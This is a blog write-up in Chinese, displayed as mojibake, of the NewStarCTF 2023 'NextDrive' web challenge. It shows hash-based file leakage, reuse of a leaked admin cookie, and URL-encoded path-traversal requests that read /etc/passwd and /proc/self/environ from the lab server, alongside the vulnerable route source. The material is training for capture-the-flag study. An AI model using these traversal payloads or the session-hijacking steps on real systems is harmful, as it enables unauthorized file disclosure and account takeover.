<h2 id="week5web-nextdrive">WEEK5|WEB-NextDrive</h2>
<p>![image-20231111173036849](NewStarCTF 2023/image-20231111173036849.png)</p>
<p>å‘ç°testè¿™ä¸ªæ–‡ä»¶å¯ç–‘ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹</p>
<pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK
<span class="hljs-attribute">content-type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8
<span class="hljs-attribute">content-length</span><span class="hljs-punctuation">: </span>50
<span class="hljs-attribute">date</span><span class="hljs-punctuation">: </span>Tue, 06 Oct 2023 13:39:21 GMT
<span class="hljs-attribute">connection</span><span class="hljs-punctuation">: </span>keep-alive
<span class="hljs-attribute">keep-alive</span><span class="hljs-punctuation">: </span>timeout=5

<span class="language-clojure">{<span class="hljs-string">"code"</span>:<span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-string">"msg"</span>:<span class="hljs-string">"success"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"logged"</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">"data"</span>:[{<span class="hljs-string">"name"</span>:<span class="hljs-string">"ã™ãšã‚ feat.åæ˜ - RADWIMPS,åæ˜.flac"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"hash"</span>:<span class="hljs-string">"5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"size"</span>:<span class="hljs-number">27471829</span><span class="hljs-punctuation">,</span><span class="hljs-string">"uploader"</span>:<span class="hljs-string">"admin"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"uploader_uid"</span>:<span class="hljs-string">"100000"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"shareTime"</span>:<span class="hljs-number">1699700843461</span><span class="hljs-punctuation">,</span><span class="hljs-string">"isYours"</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">"isOwn"</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">"ownFn"</span>:<span class="hljs-string">"ã™ãšã‚ feat.åæ˜ - RADWIMPS,åæ˜.flac"</span>}<span class="hljs-punctuation">,</span>{<span class="hljs-string">"name"</span>:<span class="hljs-string">"Windows 12 Concept.png"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"hash"</span>:<span class="hljs-string">"469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"size"</span>:<span class="hljs-number">440707</span><span class="hljs-punctuation">,</span><span class="hljs-string">"uploader"</span>:<span class="hljs-string">"admin"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"uploader_uid"</span>:<span class="hljs-string">"100000"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"shareTime"</span>:<span class="hljs-number">1699700845931</span><span class="hljs-punctuation">,</span><span class="hljs-string">"isYours"</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">"isOwn"</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">"ownFn"</span>:<span class="hljs-string">"Windows 12 Concept.png"</span>}<span class="hljs-punctuation">,</span>{<span class="hljs-string">"name"</span>:<span class="hljs-string">"ä¿¡æ¯å®‰å…¨æŠ€æœ¯ä¿¡æ¯å®‰å…¨äº‹ä»¶åˆ†ç±»åˆ†çº§æŒ‡å—.pdf"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"hash"</span>:<span class="hljs-string">"03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"size"</span>:<span class="hljs-number">330767</span><span class="hljs-punctuation">,</span><span class="hljs-string">"uploader"</span>:<span class="hljs-string">"admin"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"uploader_uid"</span>:<span class="hljs-string">"100000"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"shareTime"</span>:<span class="hljs-number">1699700846014</span><span class="hljs-punctuation">,</span><span class="hljs-string">"isYours"</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">"isOwn"</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">"ownFn"</span>:<span class="hljs-string">"ä¿¡æ¯å®‰å…¨æŠ€æœ¯ä¿¡æ¯å®‰å…¨äº‹ä»¶åˆ†ç±»åˆ†çº§æŒ‡å—.pdf"</span>}<span class="hljs-punctuation">,</span>{<span class="hljs-string">"name"</span>:<span class="hljs-string">"ä¸é™é€Ÿï¼Œå°±æ˜¯å¿«ï¼.jpg"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"hash"</span>:<span class="hljs-string">"2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"size"</span>:<span class="hljs-number">32920</span><span class="hljs-punctuation">,</span><span class="hljs-string">"uploader"</span>:<span class="hljs-string">"admin"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"uploader_uid"</span>:<span class="hljs-string">"100000"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"shareTime"</span>:<span class="hljs-number">1699700846039</span><span class="hljs-punctuation">,</span><span class="hljs-string">"isYours"</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">"isOwn"</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">"ownFn"</span>:<span class="hljs-string">"ä¸é™é€Ÿï¼Œå°±æ˜¯å¿«ï¼.jpg"</span>}<span class="hljs-punctuation">,</span>{<span class="hljs-string">"name"</span>:<span class="hljs-string">"test.req.http"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"hash"</span>:<span class="hljs-string">"e3eef7bcdae39764a2950af878a290f301f322ca78ac17c08e9912d384c511a2"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"size"</span>:<span class="hljs-number">1085</span><span class="hljs-punctuation">,</span><span class="hljs-string">"uploader"</span>:<span class="hljs-string">"admin"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"uploader_uid"</span>:<span class="hljs-string">"100000"</span><span class="hljs-punctuation">,</span><span class="hljs-string">"shareTime"</span>:<span class="hljs-number">1699700849837</span><span class="hljs-punctuation">,</span><span class="hljs-string">"isYours"</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">"isOwn"</span><span class="hljs-symbol">:true</span><span class="hljs-punctuation">,</span><span class="hljs-string">"ownFn"</span>:<span class="hljs-string">"test.req.http"</span>}]}</span></code></pre>
<p>å¯ä»¥çœ‹åˆ°å¤§æ¦‚æ˜¯æ¯ä¸ªæ–‡ä»¶å¯¹åº”æ–‡ä»¶åï¼Œå“ˆå¸Œå€¼å’Œæ–‡ä»¶å¤§å°</p>
<p>è¿™é‡Œæ³¨å†Œä¸ªç”¨æˆ·çœ‹çœ‹ï¼Œä¸è¿‡ä¸èƒ½æ³¨å†Œadminï¼Œä¼°è®¡å°±æ˜¯ä»¥adminçš„èº«ä»½ç™»å½•æ¥è·å–flag</p>
<p>éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼ŒF12å‘ç°æœ‰ä¸€ä¸ªcheckçš„è¿‡ç¨‹ï¼Œçœ‹äº†ä¹‹åå¦‚ä¸‹å›¾</p>
<p>![image-20231111173439321](NewStarCTF 2023/image-20231111173439321.png)</p>
<p>æ˜¾ç¤ºäº†ä¸ªæ— æ³•ç§’ä¼ ï¼Œä¹‹åå°±æ˜¯çœ‹wpäº†</p>
<p>å‘ç°jsonæ•°æ®åªæœ‰å“ˆå¸Œå€¼å’Œæ–‡ä»¶åï¼Œç”±äºæˆ‘ä»¬åˆšåˆšä¸‹è½½çš„æ–‡ä»¶é‡Œå¯èƒ½å­˜åœ¨æ•æ„Ÿä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯test.req.httpæ–‡ä»¶ï¼ˆå› ä¸ºé¶åœºé¦–é¡µå¹¶æ²¡æœ‰è¯¥æ–‡ä»¶ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨checkæ—¶ä½¿ç”¨è¯¥æ–‡ä»¶å¯¹åº”çš„å“ˆå¸Œå€¼å»ç»•è¿‡ï¼Œä»è€Œä¸‹è½½ä¸‹æ¥è¯¥æ–‡ä»¶</p>
<p>![image-20231111173852183](NewStarCTF 2023/image-20231111173852183.png)</p>
<p>æˆ‘ä»¬è§‚å¯Ÿåˆ°å…¶è¯·æ±‚ä½“åªå«æœ‰fnä¸hashå‚æ•°ï¼Œé‚£æˆ‘ä»¬å®Œå…¨å¯ä»¥æ„é€ ä¸Šè¿°çš„test.req.httpæ¥æ‰‹åŠ¨ä¸Šä¼ è¯¥æ–‡ä»¶</p>
<p>è¿™é‡Œå®˜æ–¹wpå¯¹autopçš„è§£é‡Šï¼š<code>autoup</code> é€‰é¡¹è¡¨ç¤ºæ£€æµ‹è¿‡æœåŠ¡å™¨å­˜åœ¨ç›¸åŒæ–‡ä»¶åç›´æ¥ uploadæ ¹æ®åˆšæ‰çš„ç»“æœ</p>
<p>æˆ‘ä»¬bpæ„é€ è¯·æ±‚</p>
<p>![image-20231111174221977](NewStarCTF 2023/image-20231111174221977.png)</p>
<p>å¦‚å›¾ä¸Šä¼ æˆåŠŸï¼Œæˆ‘ä»¬å°†å¾—åˆ°çš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥çœ‹ä¸€ä¸‹</p>
<pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/info/drive/sharezone</span> <span class="hljs-meta">HTTP/1.1</span>
<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*
<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br
<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded
<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>uid=100000; token=eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiMTAwMDAwIiwidG9rZW4iOiJlYzhlM2IzZGYwZTQ4N2FmNDVhYzFiZjIyNGJhOWVhMjViNjQyZTUyN2MyMjU0ZjFkNDQyNjM3YTUwYTQ3Y2MwIn0uY1NwBDFiH2dTfB8iDmJHaQ.BFkKSV5AcQR0RVFhT1QDFVRYDhldQytSf09RYBtXWkRQDwlLD016XXVCAmUfDltDUQsNTAxGKlZzTgo3GgVUQgINDRkMQypRcUYDZUsAAEZRWVkeCEwsXHVGATNJVFtCAggIS1kUK1cmFQNjGA4DQ1NeWU1YQyxRdk4KNB1TARQ
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:21920
<span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:21920
<span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache
<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:21920/sharezone
<span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty
<span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors
<span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin
<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0
<span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
<span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0
<span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>"Windows"</code></pre>
<p>çœ‹åˆ°è¿™é‡Œæœ‰äº†cookieå€¼ï¼ŒçŒœæµ‹è¿™ä¸ªå°±æ˜¯adminçš„å‡­è¯ï¼Œæˆ‘ä»¬æˆ–è®¸è¦æ ¹æ®è¯¥å‡­è¯è¿›è¡Œç™»å½•</p>
<p>bpæŠ“åŒ…ä¿®æ”¹cookieå€¼</p>
<p>![image-20231111174628304](NewStarCTF 2023/image-20231111174628304.png)</p>
<p>å¦‚å›¾æˆåŠŸä»¥adminèº«ä»½ç™»å½•ï¼Œè¿™é‡Œç™»å½•è¿›å»ä½†å§‹ç»ˆçœ‹ä¸åˆ°share.jsæ–‡ä»¶çš„å‡ºç°ï¼Œä¸çŸ¥é“æ˜¯å•¥åŸå› ï¼Œæ‰€ä»¥æˆ‘æƒ³ç›´æ¥ç•¥è¿‡çœ‹jsæºç äº†</p>
<p>è¿™é‡Œå›è¿‡å¤´æ¥åˆå°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ä¼¼ä¹åªæœ‰åœ¨F12å¤„ä¿®æ”¹æ‰å¯ä»¥</p>
<p>![image-20231111194406842](NewStarCTF 2023/image-20231111194406842.png)</p>
<p>å¦‚ä¸Šå›¾ï¼Œä¿®æ”¹è¿‡ååˆ·æ–°é¡µé¢å³å¯å¾—åˆ°</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">"koa-router"</span>);
<span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">"../../runtime.config.json"</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Res</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">"../../components/utils/response"</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title class_">FileSignUtil</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">"../../components/utils/file-signature"</span>);
<span class="hljs-keyword">const</span> { <span class="hljs-title class_">DriveUtil</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">"../../components/utils/database.utilities"</span>);
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);
<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">"path"</span>);
<span class="hljs-keyword">const</span> { verifySession } = <span class="hljs-built_in">require</span>(<span class="hljs-string">"../../components/utils/session"</span>);
<span class="hljs-keyword">const</span> logger = <span class="hljs-variable language_">global</span>.<span class="hljs-property">logger</span>;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@deprecated</span></span>
<span class="hljs-comment"> * ! <span class="hljs-doctag">FIXME:</span> å‘ç°æ¼æ´ï¼Œè¯·è¿›è¡Œä¿®æ”¹</span>
<span class="hljs-comment"> */</span>
router.<span class="hljs-title function_">get</span>(<span class="hljs-string">"/s/:hashfn"</span>, <span class="hljs-keyword">async</span> (ctx, next) =&gt; {
    <span class="hljs-keyword">const</span> hash_fn = <span class="hljs-title class_">String</span>(ctx.<span class="hljs-property">params</span>.<span class="hljs-property">hashfn</span> || <span class="hljs-string">''</span>)
    <span class="hljs-keyword">const</span> hash = hash_fn.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">64</span>)
    <span class="hljs-keyword">const</span> from_uid = ctx.<span class="hljs-property">query</span>.<span class="hljs-property">from_uid</span>
    <span class="hljs-keyword">const</span> custom_fn = ctx.<span class="hljs-property">query</span>.<span class="hljs-property">fn</span>

    <span class="hljs-comment">// å‚æ•°æ ¡éªŒ</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> hash_fn !== <span class="hljs-string">"string"</span> || <span class="hljs-keyword">typeof</span> from_uid !== <span class="hljs-string">"string"</span>) {
        <span class="hljs-comment">// invalid params or query</span>
        ctx.<span class="hljs-title function_">set</span>(<span class="hljs-string">"X-Error-Reason"</span>, <span class="hljs-string">"Invalid Params"</span>);
        ctx.<span class="hljs-property">status</span> = <span class="hljs-number">400</span>; <span class="hljs-comment">// Bad Request</span>
        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">res</span>.<span class="hljs-title function_">end</span>();
    }

    <span class="hljs-comment">// æ˜¯å¦ä¸ºå…±äº«çš„æ–‡ä»¶</span>
    <span class="hljs-keyword">let</span> <span class="hljs-variable constant_">IS_FILE_EXIST</span> = <span class="hljs-keyword">await</span> <span class="hljs-title class_">DriveUtil</span>.<span class="hljs-title function_">isShareFileExist</span>(hash, from_uid)
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable constant_">IS_FILE_EXIST</span>) {
        ctx.<span class="hljs-title function_">set</span>(<span class="hljs-string">"X-Error-Reason"</span>, <span class="hljs-string">"File Not Found"</span>);
        ctx.<span class="hljs-property">status</span> = <span class="hljs-number">404</span>; <span class="hljs-comment">// Not Found</span>
        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">res</span>.<span class="hljs-title function_">end</span>();
    }

    <span class="hljs-comment">// ç³»ç»Ÿä¸­æ˜¯å¦å­˜å‚¨æœ‰è¯¥æ–‡ä»¶</span>
    <span class="hljs-keyword">let</span> <span class="hljs-variable constant_">IS_FILE_EXIST_IN_STORAGE</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-variable constant_">IS_FILE_EXIST_IN_STORAGE</span> = fs.<span class="hljs-title function_">existsSync</span>(path.<span class="hljs-title function_">resolve</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">storage_path</span>, hash_fn))
    } <span class="hljs-keyword">catch</span> (e) {
        ctx.<span class="hljs-title function_">set</span>(<span class="hljs-string">"X-Error-Reason"</span>, <span class="hljs-string">"Internal Server Error"</span>);
        ctx.<span class="hljs-property">status</span> = <span class="hljs-number">500</span>; <span class="hljs-comment">// Internal Server Error</span>
        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">res</span>.<span class="hljs-title function_">end</span>();
    }
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable constant_">IS_FILE_EXIST_IN_STORAGE</span>) {
        logger.<span class="hljs-title function_">error</span>(<span class="hljs-string">`File <span class="hljs-subst">${hash_fn.yellow}</span> not found in storage, but exist in database!`</span>)
        ctx.<span class="hljs-title function_">set</span>(<span class="hljs-string">"X-Error-Reason"</span>, <span class="hljs-string">"Internal Server Error"</span>);
        ctx.<span class="hljs-property">status</span> = <span class="hljs-number">500</span>; <span class="hljs-comment">// Internal Server Error</span>
        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">res</span>.<span class="hljs-title function_">end</span>();
    }

    <span class="hljs-comment">// æ–‡ä»¶åå¤„ç†</span>
    <span class="hljs-keyword">let</span> filename = <span class="hljs-keyword">typeof</span> custom_fn === <span class="hljs-string">"string"</span> ? custom_fn : (<span class="hljs-keyword">await</span> <span class="hljs-title class_">DriveUtil</span>.<span class="hljs-title function_">getFilename</span>(from_uid, hash));
    filename = filename.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[\\\/\:\*\"\'\&lt;\&gt;\|\?\x00-\x1F\x7F]/gi</span>, <span class="hljs-string">"_"</span>)

    <span class="hljs-comment">// å‘é€</span>
    ctx.<span class="hljs-title function_">set</span>(<span class="hljs-string">"Content-Disposition"</span>, <span class="hljs-string">`attachment; filename*=UTF-8''<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(filename)}</span>`</span>);
    <span class="hljs-comment">// ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))</span>
    <span class="hljs-keyword">await</span> ctx.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">resolve</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">storage_path</span>, hash_fn)).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> {
        logger.<span class="hljs-title function_">error</span>(<span class="hljs-string">`Error while sending file <span class="hljs-subst">${hash_fn.yellow}</span>`</span>)
        logger.<span class="hljs-title function_">error</span>(e)
        ctx.<span class="hljs-property">status</span> = <span class="hljs-number">500</span>; <span class="hljs-comment">// Internal Server Error</span>
        <span class="hljs-keyword">return</span> ctx.<span class="hljs-property">res</span>.<span class="hljs-title function_">end</span>();
    })
})

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;</code></pre>
<p>å¯ä»¥çœ‹æ³¨é‡Šæœ‰hintå­˜åœ¨æ¼æ´ã€‚é¦–å…ˆæ˜¯ç»™äº†å¤„ç†GETè¯·æ±‚çš„è·¯ç”±ï¼Œå…¶ä¸­è·¯å¾„ä¸º./s/åŠ ä¸Šå‚æ•°hashfnï¼Œæ£€æµ‹å‰64ä½æ˜¯å¦ä¸ºå“ˆå¸Œå€¼ï¼Œç„¶åä»è¯·æ±‚ä¸­è·å–å‚æ•°fnå’Œfrom_uidï¼Œå…¶ä¸­from_uidè¡¨ç¤ºä¸‹è½½çš„æ–‡ä»¶æ˜¯è¿™ä¸ª uid çš„ç”¨æˆ·åˆ†äº«çš„ï¼›æ¥ç€å°±æ˜¯å‚æ•°æ£€æµ‹ï¼Œæ˜¯å¦ä¸ºå…±äº«æ–‡ä»¶ï¼ˆå‚æ•°ä¸ºå“ˆå¸Œå€¼å’Œfrom_uidï¼‰ï¼Œæ˜¯å¦å­˜å‚¨è¯¥æ–‡ä»¶ï¼Œç„¶åæ–‡ä»¶åå¤„ç†ï¼›æœ€åå‘é€æ—¶åˆ©ç”¨path.resolveå‡½æ•°å¤„ç†ï¼Œæ³¨æ„é‡Œé¢çš„å‚æ•°hash_fnæ˜¯å®Œå…¨å¯æ§çš„ï¼Œæˆ‘ä»¬åªéœ€è¦è®©64ä½å“ˆå¸Œå€¼åé¢è·Ÿä¸Šâ€¦/å³å¯å®ç°è·¯å¾„ç©¿è¶Š</p>
<p>ä¸è¿‡è¿™é‡Œ/è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬éœ€è¦urlç¼–ç ä¸€ä¸‹</p>
<pre><code class="hljs plaintext">http://node4.buuoj.cn:28489/s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd?from_uid=100000</code></pre>
<p>![image-20231111194656272](NewStarCTF 2023/image-20231111194656272.png)</p>
<p>å¦‚ä¸Šå›¾æˆåŠŸä¸‹è½½å¾—åˆ°ï¼Œæ¥ä¸‹æ¥è¯»å–ç¯å¢ƒå˜é‡å³å¯</p>
<pre><code class="hljs plaintext">/s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron?from_uid=100000</code></pre>
<p>![image-20231111194814579](NewStarCTF 2023/image-20231111194814579.png)</p>
<h1 id="0x03-å‚è€ƒæ–‡ç« ">0x03 å‚è€ƒæ–‡ç« </h1>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/JCPS_Y/article/details/127541665">æµ…è°ˆæ–‡ä»¶åŒ…å«ä¹‹åŒ…å«pearcmd.phpæ¼æ´</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_63138919/article/details/133958661?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169849126916800215075943%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169849126916800215075943&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-133958661-null-null.142%5Ev96%5Epc_search_result_base4&amp;utm_term=newstarctf2023%20week3%20web&amp;spm=1018.2226.3001.4187">[wp]NewStarCTF 2023 WEEK3|WEB</a></p>
<p>[<a target="_blank" rel="noopener" href="https://yyz9.cn/2020/11/26/%E4%BB%8E2020%E5%AE%89%E6%B4%B5%E6%9D%AF%E8%B5%9B%E5%90%8E%E4%BB%A5%E5%8F%8A%E8%BF%91%E6%9C%9F%E9%81%87%E5%88%B0%E7%9A%84ssti%E6%80%BB%E7%BB%93/">ä»[2020å®‰æ´µæ¯]èµ›åä»¥åŠè¿‘æœŸé‡åˆ°çš„SSTIæ€»ç»“]</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.m1kael.cn/index.php/archives/14/">PHPçš„GCæœºåˆ¶</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11843">æµ…æPHP GCåƒåœ¾å›æ”¶æœºåˆ¶åŠå¸¸è§åˆ©ç”¨æ–¹å¼</a>â€“å…ˆçŸ¥ç¤¾åŒº</p>
<p><a target="_blank" rel="noopener" href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#destruct-%E7%9B%B8%E5%85%B3">php(phar)ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62046696/article/details/127195593">pharæ–‡ä»¶ä¸Šä¼ çš„éªšå§¿åŠ¿ï¼ˆç»•è¿‡pharã€_HALTï¼‰</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6699#toc-4">phpååºåˆ—åŒ–æ‹“å±•æ”»å‡»è¯¦è§£â€“phar</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3692">Pharçš„ä¸€äº›åˆ©ç”¨å§¿åŠ¿</a></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/gzip/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTk2MTcxNDIsImZpbGVHVUlEIjoiUjNzR2daZHJseUU2bkw4VCIsImlhdCI6MTY5OTYxNjg0MiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo5MTUyMDIyOH0.5HAbVX4DJZeVUmDCSBV-Cyxt8wKO2C_trJ1bg4A_SjQ">gzip</a></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>è®¸å¯åè®®</span></div>
      <div class="body"><p>æœ¬æ–‡é‡‡ç”¨ <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº« 4.0 å›½é™…</a> è®¸å¯åè®®ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">è¾ƒæ–°æ–‡ç« </div><a href="/2023/10/15/sql-zhu-ru-tuo-zhan/">sqlæ³¨å…¥å­¦ä¹ --æ‹“å±•</a></div><div class="item" id="next"><div class="note">è¾ƒæ—©æ–‡ç« </div><a href="/2023/10/08/sql-zhu-ru-zhi-access-shu-ju-ku/">SQLæ³¨å…¥ä¹‹Accessç¯‡</a></div></section></div>






<footer class="page-footer footnote"><hr><div class="text"><p>æœ¬ç«™ç”± <a href="/">hybcx</a> ä½¿ç”¨ <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> ä¸»é¢˜åˆ›å»ºã€‚<br>
æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">æœ¬æ–‡ç›®å½•</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-text">0x01 å‰è¨€</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#week1web-%E6%B3%84%E6%BC%8F%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-text">WEEK1|WEB-æ³„æ¼çš„ç§˜å¯†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week1web-begin-of-upload"><span class="toc-text">WEEK1|WEB-Begin of Upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week1web-begin-of-http"><span 